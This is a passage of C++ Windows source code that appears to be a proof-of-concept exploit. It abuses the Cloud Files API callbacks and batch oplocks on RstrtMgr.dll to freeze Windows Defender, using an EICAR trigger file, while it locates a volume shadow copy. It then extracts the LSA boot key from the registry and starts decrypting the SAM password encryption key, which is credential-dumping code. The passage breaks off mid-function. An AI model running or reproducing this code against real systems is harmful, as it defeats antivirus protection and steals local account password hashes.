	DWORD reqsz = sizeof(ssp);
	bool res = QueryServiceStatusEx(hsvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, reqsz, &reqsz);
	DWORD queryerror = res ? ERROR_SUCCESS : GetLastError();
	CloseServiceHandle(hsvc);
	if (!res) {
		LogE("[DEFENDER-PID] QueryServiceStatusEx failed: %lu", queryerror);
		return 0;
	}
	retval = ssp.dwProcessId;
	LogV("[DEFENDER-PID] WinDefend process ID=%lu\n", retval);
	return retval;

}

void CfCallbackFetchPlaceHolders(
	_In_ CONST CF_CALLBACK_INFO* CallbackInfo,
	_In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
) {
	if (!CallbackInfo || !CallbackParameters || !CallbackInfo->ProcessInfo)
	{
		LogE("[CLOUD-CALLBACK] Invalid callback input");
		return;
	}

	CF_PROCESS_INFO* cpi = CallbackInfo->ProcessInfo;
	wchar_t* procname = PathFindFileName(cpi->ImagePath);
	DWORD defenderpid = GetWDPID();
	LogV("[CLOUD-CALLBACK] Placeholder query: process=%ws, pid=%lu, defender_pid=%lu\n",
		procname ? procname : L"(unknown)", cpi->ProcessId, defenderpid);
	if (defenderpid && defenderpid == cpi->ProcessId)
	{
		cldcallbackctx* ctx = (cldcallbackctx*)CallbackInfo->CallbackContext;
		if (!ctx)
		{
			LogE("[CLOUD-CALLBACK] Defender callback has a NULL context");
			return;
		}
		SetEvent(ctx->hnotifywdaccess);;
		LogV("[CLOUD-CALLBACK] Defender access observed; waiting for the lock event\n");

		//printf("Defender flagged.\n");
		CF_OPERATION_INFO cfopinfo = { 0 };
		cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
		cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
		cfopinfo.ConnectionKey = CallbackInfo->ConnectionKey;
		cfopinfo.TransferKey = CallbackInfo->TransferKey;
		cfopinfo.CorrelationVector = CallbackInfo->CorrelationVector;
		cfopinfo.RequestKey = CallbackInfo->RequestKey;
		//STATUS_CLOUD_FILE_REQUEST_TIMEOUT
		SYSTEMTIME systime = { 0 };
		FILETIME filetime = { 0 };
		GetSystemTime(&systime);
		SystemTimeToFileTime(&systime, &filetime);

		FILE_BASIC_INFO filebasicinfo = { 0 };
		filebasicinfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
		CF_FS_METADATA fsmetadata = { filebasicinfo, {0x1000} };
		CF_PLACEHOLDER_CREATE_INFO placeholder[1] = { 0 };
		GUID uid = { 0 };
		RPC_WSTR wuid = { 0 };
		placeholder[0].RelativeFileName = ctx->filename;

		placeholder[0].FsMetadata = fsmetadata;

		RPC_STATUS uuidstatus = UuidCreate(&uid);
		if (uuidstatus != RPC_S_OK && uuidstatus != RPC_S_UUID_LOCAL_ONLY)
		{
			LogE("[CLOUD-CALLBACK] UuidCreate failed: 0x%08lX", (unsigned long)uuidstatus);
			return;
		}
		uuidstatus = UuidToStringW(&uid, &wuid);
		if (uuidstatus != RPC_S_OK || !wuid)
		{
			LogE("[CLOUD-CALLBACK] UuidToStringW failed: 0x%08lX", (unsigned long)uuidstatus);
			return;
		}
		wchar_t* wuid2 = (wchar_t*)wuid;
		placeholder[0].FileIdentity = wuid2;
		placeholder[0].FileIdentityLength = lstrlenW(wuid2) * sizeof(wchar_t);
		placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE;


		CF_OPERATION_PARAMETERS cfopparams = { 0 };
		cfopparams.ParamSize = sizeof(cfopparams);
		cfopparams.TransferPlaceholders.PlaceholderCount = 1;
		cfopparams.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 1;
		cfopparams.TransferPlaceholders.EntriesProcessed = 0;
		cfopparams.TransferPlaceholders.Flags = CF_OPERATION_TRANSFER_PLACEHOLDERS_FLAG_NONE;
		cfopparams.TransferPlaceholders.PlaceholderArray = placeholder;

		DWORD lockwait = WaitOneWithHeartbeat(ctx->hnotifylockcreated,
			LAB_WAIT_TIMEOUT_MS, "cloud-callback-lock-created");
		if (lockwait != WAIT_OBJECT_0)
		{
			LogE("[CLOUD-CALLBACK] Lock-event wait ended: result=0x%08lX, error=%lu",
				(unsigned long)lockwait, GetLastError());
			RpcStringFreeW(&wuid);
			return;
		}
		HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
		LogV("[CLOUD-CALLBACK] Defender placeholder response completed: hr=0x%08lX\n",
			(unsigned long)hs);
		RpcStringFreeW(&wuid);
		return;
	}
	CF_OPERATION_INFO cfopinfo = { 0 };
	cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
	cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
	cfopinfo.ConnectionKey = CallbackInfo->ConnectionKey;
	cfopinfo.TransferKey = CallbackInfo->TransferKey;
	cfopinfo.CorrelationVector = CallbackInfo->CorrelationVector;
	cfopinfo.RequestKey = CallbackInfo->RequestKey;
	CF_OPERATION_PARAMETERS cfopparams = { 0 };
	cfopparams.ParamSize = sizeof(cfopparams);
	cfopparams.TransferPlaceholders.PlaceholderCount = 0;
	cfopparams.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 0;
	cfopparams.TransferPlaceholders.EntriesProcessed = 0;
	cfopparams.TransferPlaceholders.Flags = CF_OPERATION_TRANSFER_PLACEHOLDERS_FLAG_NONE;
	cfopparams.TransferPlaceholders.PlaceholderArray = { 0 };
	HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
	LogV("[CLOUD-CALLBACK] Non-Defender request answered with an empty set: hr=0x%08lX\n",
		(unsigned long)hs);

	return;


}

DWORD WINAPI FreezeVSS(void* arg)
{
	if (!arg)
	{
		LogE("[VSS-FREEZE] Worker received a NULL argument");
		return ERROR_BAD_ARGUMENTS;
	}
	// TriggerWDForVS transfers a heap-allocated argument block to this worker.
	// Copy it immediately so the worker owns no caller stack memory.
	cloudworkerthreadargs workerargs = *(cloudworkerthreadargs*)arg;
	free(arg);

	HANDLE hlock = NULL;
	HRESULT hs = S_OK;
	CF_SYNC_REGISTRATION cfreg = { 0 };
	cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
	cfreg.ProviderName = L"IHATEMICROSOFT";
	cfreg.ProviderVersion = L"1.0";
	CF_SYNC_POLICIES syncpolicy = { 0 };
	syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
	syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
	syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
	syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED;
	syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
	syncpolicy.InSync = CF_INSYNC_POLICY_NONE;
	CF_CALLBACK_REGISTRATION callbackreg[2];
	callbackreg[0] = { CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS, CfCallbackFetchPlaceHolders };
	callbackreg[1] = { CF_CALLBACK_TYPE_NONE, NULL };
	CF_CONNECTION_KEY cfkey = { 0 };
	OVERLAPPED ovd = { 0 };
	DWORD nwf = 0;
	wchar_t syncroot[MAX_PATH] = { 0 };
	DWORD retval = STATUS_SUCCESS;
	wchar_t lockfile[MAX_PATH] = { 0 };
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	cldcallbackctx callbackctx = { 0 };
	bool syncrootregistered = false;
	bool syncrootconnected = false;
	const char* exitreason = "completed";
	DWORD waitres = WAIT_FAILED;
	BOOL oplockimmediate = FALSE;
	DWORD oplockstatus = ERROR_SUCCESS;
	RPC_STATUS uuidstatus = RPC_S_OK;
	DWORD modulechars = 0;
	wchar_t* modulebase = NULL;

#define FREEZE_FAIL(reason, code) \
	do { \
		exitreason = (reason); retval = (DWORD)(code); \
		LogE("[VSS-FREEZE] Exit: reason=%s, code=0x%08lX", \
			exitreason, (unsigned long)retval); \
		goto cleanup; \
	} while (0)

	LogV("[VSS-FREEZE] Worker entered; inherited lock=%p, release_event=%p, ready_event=%p\n",
		workerargs.hlock, workerargs.hcleanupevent, workerargs.hvssready);
	if (!workerargs.hlock || !workerargs.hcleanupevent || !workerargs.hvssready)
		FREEZE_FAIL("required worker handle is NULL", ERROR_INVALID_HANDLE);

	modulechars = GetModuleFileNameW(NULL, syncroot, MAX_PATH);
	if (!modulechars || modulechars >= MAX_PATH)
		FREEZE_FAIL("GetModuleFileNameW failed", GetLastError());
	modulebase = PathFindFileNameW(syncroot);
	if (!modulebase || modulebase == syncroot)
		FREEZE_FAIL("could not derive sync-root directory", ERROR_INVALID_NAME);
	*(modulebase - 1) = L'\0';
	LogV("[VSS-FREEZE] Cloud sync root=%ws\n", syncroot);

	uuidstatus = UuidCreate(&uid);
	if (uuidstatus != RPC_S_OK && uuidstatus != RPC_S_UUID_LOCAL_ONLY)
		FREEZE_FAIL("UuidCreate failed", uuidstatus);
	uuidstatus = UuidToStringW(&uid, &wuid);
	if (uuidstatus != RPC_S_OK || !wuid)
		FREEZE_FAIL("UuidToStringW failed", uuidstatus);
	if (wcslen(syncroot) + wcslen((wchar_t*)wuid) + 7 >= MAX_PATH)
		FREEZE_FAIL("lock-file path is too long", ERROR_BUFFER_OVERFLOW);
	wcscpy(lockfile, syncroot);
	wcscat(lockfile, L"\\");
	wcscat(lockfile, (wchar_t*)wuid);
	wcscat(lockfile, L".lock");

	callbackctx.hnotifywdaccess = CreateEvent(NULL, FALSE, FALSE, NULL);
	callbackctx.hnotifylockcreated = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!callbackctx.hnotifylockcreated || !callbackctx.hnotifywdaccess)
		FREEZE_FAIL("CreateEvent(callback coordination) failed", GetLastError());
	wcscpy(callbackctx.filename, (wchar_t*)wuid);
	wcscat(callbackctx.filename, L".lock");
	hlock = CreateFileW(lockfile, GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_NEW,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (!hlock || hlock == INVALID_HANDLE_VALUE)
		FREEZE_FAIL("CreateFileW(cloud lock file) failed", GetLastError());
	LogV("[VSS-FREEZE] Lock file created=%ws, handle=%p\n", lockfile, hlock);

	hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_NONE);
	if (FAILED(hs))
		FREEZE_FAIL("CfRegisterSyncRoot failed", hs);
	syncrootregistered = true;
	LogV("[VSS-FREEZE] Sync root registered\n");
	hs = CfConnectSyncRoot(syncroot, callbackreg, &callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
	if (FAILED(hs))
		FREEZE_FAIL("CfConnectSyncRoot failed", hs);
	syncrootconnected = true;
	LogV("[VSS-FREEZE] Sync root connected; releasing inherited Restart Manager lock\n");
	CloseHandle(workerargs.hlock);
	workerargs.hlock = NULL;

	LogV("[VSS-FREEZE] Waiting up to %lu ms for Defender cloud access\n", LAB_WAIT_TIMEOUT_MS);
	waitres = WaitOneWithHeartbeat(callbackctx.hnotifywdaccess,
		LAB_WAIT_TIMEOUT_MS, "freeze-defender-cloud-access");
	if (waitres == WAIT_TIMEOUT)
		FREEZE_FAIL("timed out waiting for Defender cloud access", WAIT_TIMEOUT);
	if (waitres != WAIT_OBJECT_0)
		FREEZE_FAIL("WaitForSingleObject(Defender cloud access) failed", GetLastError());
	LogV("[VSS-FREEZE] Defender cloud access observed\n");

	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!ovd.hEvent)
		FREEZE_FAIL("CreateEvent(cloud oplock) failed", GetLastError());
	SetLastError(ERROR_SUCCESS);
	oplockimmediate = DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK,
		NULL, 0, NULL, 0, NULL, &ovd);
	oplockstatus = oplockimmediate ? ERROR_SUCCESS : GetLastError();
	if (oplockimmediate || oplockstatus != ERROR_IO_PENDING)
		FREEZE_FAIL("cloud oplock was not left pending",
			oplockimmediate ? ERROR_OPLOCK_NOT_GRANTED : oplockstatus);
	LogV("[VSS-FREEZE] Cloud oplock is pending\n");
	if (!SetEvent(callbackctx.hnotifylockcreated))
		FREEZE_FAIL("SetEvent(lock created) failed", GetLastError());

	if (!oplockimmediate)
	{
		waitres = WaitOneWithHeartbeat(ovd.hEvent,
			LAB_WAIT_TIMEOUT_MS, "freeze-cloud-oplock-break");
		if (waitres == WAIT_TIMEOUT)
		{
			CancelIo(hlock);
			FREEZE_FAIL("timed out waiting for cloud oplock break", WAIT_TIMEOUT);
		}
		if (waitres != WAIT_OBJECT_0)
			FREEZE_FAIL("WaitForSingleObject(cloud oplock) failed", GetLastError());
		if (!GetOverlappedResult(hlock, &ovd, &nwf, FALSE))
			FREEZE_FAIL("GetOverlappedResult(cloud oplock) failed", GetLastError());
	}
	LogV("[VSS-FREEZE] Defender is frozen; signalling snapshot readiness\n");
	if (!SetEvent(workerargs.hvssready))
		FREEZE_FAIL("SetEvent(snapshot ready) failed", GetLastError());

	waitres = WaitOneWithHeartbeat(workerargs.hcleanupevent,
		LAB_WAIT_TIMEOUT_MS, "freeze-main-release");
	if (waitres == WAIT_TIMEOUT)
		FREEZE_FAIL("timed out waiting for main-flow release", WAIT_TIMEOUT);
	if (waitres != WAIT_OBJECT_0)
		FREEZE_FAIL("WaitForSingleObject(main-flow release) failed", GetLastError());
	LogV("[VSS-FREEZE] Main-flow release received\n");

	
	
cleanup:

	if (hlock)
		CloseHandle(hlock);
	if (callbackctx.hnotifylockcreated)
		CloseHandle(callbackctx.hnotifylockcreated);
	if (callbackctx.hnotifywdaccess)
		CloseHandle(callbackctx.hnotifywdaccess);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);

	if (syncrootconnected)
		CfDisconnectSyncRoot(cfkey);
	if (syncrootregistered)
		CfUnregisterSyncRoot(syncroot);
	if (workerargs.hlock)
		CloseHandle(workerargs.hlock);
	if (wuid)
		RpcStringFreeW(&wuid);
	if (retval == ERROR_SUCCESS)
		LogV("[VSS-FREEZE] Worker completed successfully\n");
	else
		LogE("[VSS-FREEZE] Worker completed with failure: reason=%s, code=0x%08lX",
			exitreason, (unsigned long)retval);
	SetLastError(retval);

	#undef FREEZE_FAIL
	return retval;

}


bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
{
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	wchar_t* wuid2 = NULL;
	wchar_t workdir[MAX_PATH] = { 0 };
	wchar_t eicarfilepath[MAX_PATH] = { 0 };
	HANDLE hlock = NULL;
	wchar_t rstmgr[MAX_PATH] = { 0 };
	OVERLAPPED ovd = { 0 };
	char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
	DWORD nwf = 0;
	cloudworkerthreadargs* workerargs = NULL;
	DWORD tid = 0;
	HANDLE hthread = NULL;
	bool dircreated = false;
	bool retval = true;
	HANDLE hfile = NULL;
	HANDLE trigger = NULL;
	HANDLE hthread2 = NULL;
	HANDLE hobj[2] = { 0 };
	DWORD exitcode = STATUS_SUCCESS;
	DWORD waitres = WAIT_FAILED;
	DWORD failcode = ERROR_SUCCESS;
	const char* failreason = "completed";
	RPC_STATUS uuidstatus = RPC_S_OK;
	DWORD expandedchars = 0;
	BOOL oplockimmediate = FALSE;
	DWORD oplockstatus = ERROR_SUCCESS;
	HANDLE hvssready = NULL;

#define TRIGGER_FAIL(reason, code) \
	do { \
		failreason = (reason); failcode = (DWORD)(code); retval = false; \
		LogE("[VSS-TRIGGER] Exit: reason=%s, code=0x%08lX", \
			failreason, (unsigned long)failcode); \
		goto cleanup; \
	} while (0)

	LogV("[VSS-TRIGGER] Entered; release_event=%p, output=%p\n",
		hreleaseevent, fullvsspath);
	if (!hreleaseevent || !fullvsspath)
		TRIGGER_FAIL("invalid input handle or output buffer", ERROR_BAD_ARGUMENTS);
	uuidstatus = UuidCreate(&uid);
	if (uuidstatus != RPC_S_OK && uuidstatus != RPC_S_UUID_LOCAL_ONLY)
		TRIGGER_FAIL("UuidCreate failed", uuidstatus);
	uuidstatus = UuidToStringW(&uid, &wuid);
	if (uuidstatus != RPC_S_OK || !wuid)
		TRIGGER_FAIL("UuidToStringW failed", uuidstatus);
	wuid2 = (wchar_t*)wuid;

	expandedchars = ExpandEnvironmentStringsW(L"%TEMP%\\", workdir, MAX_PATH);
	if (!expandedchars || expandedchars >= MAX_PATH)
		TRIGGER_FAIL("ExpandEnvironmentStringsW(%TEMP%) failed", GetLastError());
	if (wcslen(workdir) + wcslen(wuid2) + 1 >= MAX_PATH)
		TRIGGER_FAIL("VSS trigger work-directory path is too long", ERROR_BUFFER_OVERFLOW);
	wcscat(workdir, wuid2);
	if (wcslen(workdir) + 9 >= MAX_PATH)
		TRIGGER_FAIL("EICAR trigger path is too long", ERROR_BUFFER_OVERFLOW);
	wcscpy(eicarfilepath,workdir);
	wcscat(eicarfilepath,L"\\foo.exe");

	expandedchars = ExpandEnvironmentStringsW(L"%windir%\\System32\\RstrtMgr.dll", rstmgr, MAX_PATH);
	if (!expandedchars || expandedchars >= MAX_PATH)
		TRIGGER_FAIL("ExpandEnvironmentStringsW(RstrtMgr.dll) failed", GetLastError());
	LogV("[VSS-TRIGGER] Paths: workdir=%ws, trigger=%ws, oplock_target=%ws\n",
		workdir, eicarfilepath, rstmgr);
	rev(eicar);

	hthread = CreateThread(NULL, NULL, ShadowCopyFinderThread, (void*)fullvsspath, NULL, &tid);
	if (!hthread)
		TRIGGER_FAIL("CreateThread(ShadowCopyFinderThread) failed", GetLastError());
	LogV("[VSS-TRIGGER] Shadow-copy finder started: handle=%p, tid=%lu\n", hthread, tid);
	
	dircreated = CreateDirectoryW(workdir, NULL);
	if (!dircreated)
		TRIGGER_FAIL("CreateDirectoryW(trigger work directory) failed", GetLastError());
	LogV("[VSS-TRIGGER] Trigger work directory created\n");

	hfile = CreateFileW(eicarfilepath, GENERIC_READ | GENERIC_WRITE | DELETE,
		FILE_SHARE_READ, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (!hfile || hfile == INVALID_HANDLE_VALUE)
		TRIGGER_FAIL("CreateFileW(EICAR trigger) failed", GetLastError());
	LogV("[VSS-TRIGGER] Trigger file created: handle=%p\n", hfile);
	if (!WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL) ||
		nwf != sizeof(eicar) - 1)
		TRIGGER_FAIL("WriteFile(EICAR trigger) failed or was short",
			nwf == sizeof(eicar) - 1 ? GetLastError() : ERROR_WRITE_FAULT);
	LogV("[VSS-TRIGGER] Trigger content written: %lu bytes\n", nwf);

	hlock = CreateFileW(rstmgr, GENERIC_READ | SYNCHRONIZE, 0, NULL,
		OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
	if (!hlock || hlock == INVALID_HANDLE_VALUE)
		TRIGGER_FAIL("CreateFileW(RstrtMgr.dll exclusive) failed", GetLastError());
	LogV("[VSS-TRIGGER] Restart Manager DLL opened exclusively: handle=%p\n", hlock);

	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!ovd.hEvent)
		TRIGGER_FAIL("CreateEvent(RstrtMgr oplock) failed", GetLastError());

	SetLastError(ERROR_SUCCESS);
	oplockimmediate = DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK,
		NULL, 0, NULL, 0, NULL, &ovd);
	oplockstatus = oplockimmediate ? ERROR_SUCCESS : GetLastError();
	if (oplockimmediate || oplockstatus != ERROR_IO_PENDING)
		TRIGGER_FAIL("RstrtMgr oplock was not left pending", oplockimmediate ? ERROR_OPLOCK_NOT_GRANTED : oplockstatus);
	LogV("[VSS-TRIGGER] Restart Manager oplock is pending; triggering Defender\n");

	// trigger wd for action
	trigger = CreateFileW(eicarfilepath, GENERIC_READ,
		FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (trigger && trigger != INVALID_HANDLE_VALUE)
	{
		LogV("[VSS-TRIGGER] Trigger file opened for scanning\n");
		CloseHandle(trigger);
		trigger = NULL;
	}
	else
	{
		LogV("[VSS-TRIGGER] Trigger open returned error=%lu (the file may already be quarantined)\n",
			GetLastError());
		trigger = NULL;
	}

	LogV("[VSS-TRIGGER] Waiting up to %lu ms for Restart Manager oplock break\n",
		LAB_WAIT_TIMEOUT_MS);
	waitres = WaitOneWithHeartbeat(ovd.hEvent,
		LAB_WAIT_TIMEOUT_MS, "trigger-rstrtmgr-oplock-break");
	if (waitres == WAIT_TIMEOUT)
	{
		CancelIo(hlock);
		TRIGGER_FAIL("timed out waiting for Restart Manager oplock break", WAIT_TIMEOUT);
	}
	if (waitres != WAIT_OBJECT_0)
		TRIGGER_FAIL("WaitForSingleObject(RstrtMgr oplock) failed", GetLastError());
	if (!GetOverlappedResult(hlock, &ovd, &nwf, FALSE))
		TRIGGER_FAIL("GetOverlappedResult(RstrtMgr oplock) failed", GetLastError());
	LogV("[VSS-TRIGGER] Restart Manager oplock break observed\n");

	LogV("[VSS-TRIGGER] Waiting up to %lu ms for the snapshot finder\n",
		LAB_WAIT_TIMEOUT_MS);
	waitres = WaitOneWithHeartbeat(hthread,
		LAB_WAIT_TIMEOUT_MS, "trigger-shadow-finder");
	if (waitres == WAIT_TIMEOUT)
		TRIGGER_FAIL("timed out waiting for ShadowCopyFinderThread", WAIT_TIMEOUT);
	if (waitres != WAIT_OBJECT_0)
		TRIGGER_FAIL("WaitForSingleObject(ShadowCopyFinderThread) failed", GetLastError());

	if (!GetExitCodeThread(hthread, &exitcode))
		TRIGGER_FAIL("GetExitCodeThread(ShadowCopyFinderThread) failed", GetLastError());
	if (exitcode)
		TRIGGER_FAIL("ShadowCopyFinderThread returned an error", exitcode);
	LogV("[VSS-TRIGGER] Snapshot finder completed: path=%ws\n", fullvsspath);

	hvssready = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!hvssready)
		TRIGGER_FAIL("CreateEvent(VSS freeze ready) failed", GetLastError());
	workerargs = (cloudworkerthreadargs*)malloc(sizeof(cloudworkerthreadargs));
	if (!workerargs)
		TRIGGER_FAIL("malloc(FreezeVSS arguments) failed", ERROR_NOT_ENOUGH_MEMORY);
	ZeroMemory(workerargs, sizeof(cloudworkerthreadargs));
	workerargs->hcleanupevent = hreleaseevent;
	workerargs->hlock = hlock;
	workerargs->hvssready = hvssready;
	hthread2 = CreateThread(NULL, NULL, FreezeVSS, workerargs, NULL, &tid);
	if (!hthread2)
		TRIGGER_FAIL("CreateThread(FreezeVSS) failed", GetLastError());
	// The worker now owns both the argument block and the inherited hlock.
	workerargs = NULL;
	hlock = NULL;
	LogV("[VSS-TRIGGER] Freeze worker started: handle=%p, tid=%lu\n", hthread2, tid);
	hobj[0] = hthread2;
	hobj[1] = hvssready;
	waitres = WaitManyWithHeartbeat(2, hobj, FALSE,
		LAB_WAIT_TIMEOUT_MS, "trigger-freeze-ready");
	if (waitres == WAIT_OBJECT_0)
	{
		if (!GetExitCodeThread(hthread2, &exitcode))
			exitcode = GetLastError();
		TRIGGER_FAIL("FreezeVSS worker exited before readiness", exitcode);
	}
	if (waitres == WAIT_TIMEOUT)
		TRIGGER_FAIL("timed out waiting for FreezeVSS readiness", WAIT_TIMEOUT);
	if (waitres != WAIT_OBJECT_0 + 1)
		TRIGGER_FAIL("WaitForMultipleObjects(FreezeVSS) failed", GetLastError());
	LogV("[VSS-TRIGGER] FreezeVSS reported readiness\n");

cleanup:
	if (hthread)
	{
		WaitOneWithHeartbeat(hthread, 5000, "trigger-shadow-cleanup");
		CloseHandle(hthread);
	}
	if(hthread2)
	{
		if (!retval && hreleaseevent)
			SetEvent(hreleaseevent);
		WaitOneWithHeartbeat(hthread2, 5000, "trigger-freeze-cleanup");
		CloseHandle(hthread2);
	}
	if (workerargs)
		free(workerargs);
	if(hvssready)
		CloseHandle(hvssready);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);
	if (hfile && hfile != INVALID_HANDLE_VALUE)
		CloseHandle(hfile);
	if (hlock && hlock != INVALID_HANDLE_VALUE)
		CloseHandle(hlock);
	if (dircreated)
		RemoveDirectoryW(workdir);
	if (wuid)
		RpcStringFreeW(&wuid);
	if (retval)
		LogV("[VSS-TRIGGER] Completed successfully\n");
	else
		LogE("[VSS-TRIGGER] Returning failure: reason=%s, code=0x%08lX",
			failreason, (unsigned long)failcode);
	SetLastError(failcode);

	#undef TRIGGER_FAIL
	return retval;



}
//////////////////////////////////////////////////////////////////////
// Volume shadow copy functions end
/////////////////////////////////////////////////////////////////////



void hex_string_to_bytes(const char* hex_string, unsigned char* byte_array, size_t max_len) {
	size_t len = strlen(hex_string);
	if (len % 2 != 0) {
		//fprintf(stderr, "Error: Hex string length must be even.\n");
		return;
	}

	size_t byte_len = len / 2;
	if (byte_len > max_len) {
		//fprintf(stderr, "Error: Output buffer too small.\n");
		return;
	}

	for (size_t i = 0; i < byte_len; i++) {
		// Read two hex characters and convert them to an unsigned int
		unsigned int byte_val;
		if (sscanf(&hex_string[i * 2], "%2x", &byte_val) != 1) {
			//fprintf(stderr, "Error: Invalid hex character in string.\n");
			return;
		}
		byte_array[i] = (unsigned char)byte_val;
	}
}

bool GetLSASecretKey(unsigned char bootkeybytes[16])
{

	const wchar_t* keynames[] = { {L"JD"}, {L"Skew1"}, {L"GBG"}, {L"Data"} };
	int indices[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };


	//ORHKEY hlsa = NULL;
	HKEY hlsa = NULL;
	DWORD err = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", NULL, KEY_READ, &hlsa);
	char data[0x1000] = { 0 };
	DWORD index = 0;
	for (const wchar_t* keyname : keynames)
	{
		DWORD retsz = sizeof(data) / sizeof(char);
		HKEY hbootkey = NULL;
		err = RegOpenKeyEx(hlsa, keyname, NULL, KEY_QUERY_VALUE, &hbootkey);

		err = RegQueryInfoKeyA(hbootkey, &data[index], &retsz, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		index += retsz;
		RegCloseKey(hbootkey);
	}
	////printf("%s\n", data);
	RegCloseKey(hlsa);

	if (strlen(data) < 16)
	{
		//printf("Boot key mismatch.");
		return 1;
	}

	// convert hex string to binary
	unsigned char keybytes[16] = { 0 };
	hex_string_to_bytes(data, keybytes, 16);



	for (int i = 0; i < sizeof(keybytes); i++)
	{

		bootkeybytes[i] = keybytes[indices[i]];
	}
	return true;

}

void* UnprotectAES(char* lsaKey, char* iv, char* hashdata, unsigned long enclen, int* decryptedlen)
{

	char* decrypted = (char*)malloc(enclen);
	memmove(decrypted, hashdata, enclen);
	HCRYPTPROV hprov = NULL;

	CryptAcquireContext(&hprov, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

	struct aes128keyBlob
	{
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE bytes[16];
	} blob;

	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_AES_128;
	blob.keySize = 16;
	memmove(blob.bytes, lsaKey, 16);
	HCRYPTKEY hcryptkey = NULL;
	CryptImportKey(hprov, (const BYTE*)&blob, sizeof(aes128keyBlob), NULL, NULL, &hcryptkey);

	DWORD mode = CRYPT_MODE_CBC;
	CryptSetKeyParam(hcryptkey, KP_IV, (const BYTE*)iv, NULL);
	
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);

	DWORD retsz = enclen;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);

	CryptDestroyKey(hcryptkey);
	CryptReleaseContext(hprov, NULL);

	if (decryptedlen)
		*decryptedlen = retsz;

	return decrypted;

}

#ifndef SHA256_DIGEST_LENGTH
#define SHA256_DIGEST_LENGTH 32
#endif

bool ComputeSHA256(char* data, int size, char hashout[SHA256_DIGEST_LENGTH])
{


	HCRYPTPROV hprov = NULL;
	CryptAcquireContext(&hprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	HCRYPTHASH Hhash = NULL;
	CryptCreateHash(hprov, CALG_SHA_256, NULL, NULL, &Hhash);
	CryptHashData(Hhash, (const BYTE*)data, size, NULL);
	DWORD md_len = 0;
	DWORD inputsz = sizeof(md_len);
	CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, NULL);
	//inputsz = size;
	CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)hashout, &md_len, NULL);

	CryptDestroyHash(Hhash);
	CryptReleaseContext(hprov, NULL);
	/*
	EVP_MD_CTX* en = EVP_MD_CTX_new();

	bool retval = EVP_DigestInit(en, EVP_sha256());
	if (!retval)
		return retval;
	retval = EVP_DigestUpdate(en, data, size);
	if (!retval)
		return retval;
	EVP_DigestFinal(en, (unsigned char*)hashout, NULL);
	*/
	//return retval;
	return true;



}

void* UnprotectPasswordEncryptionKeyAES(char* data, char* lsaKey, int* keysz)
{

	int hashlen = data[0];
	int enclen = data[4];

	char iv[16] = { 0 };
	memmove(iv, &data[8], sizeof(iv));

	char* cyphertext = (char*)malloc(enclen);
	memmove(cyphertext, &data[0x18], enclen);

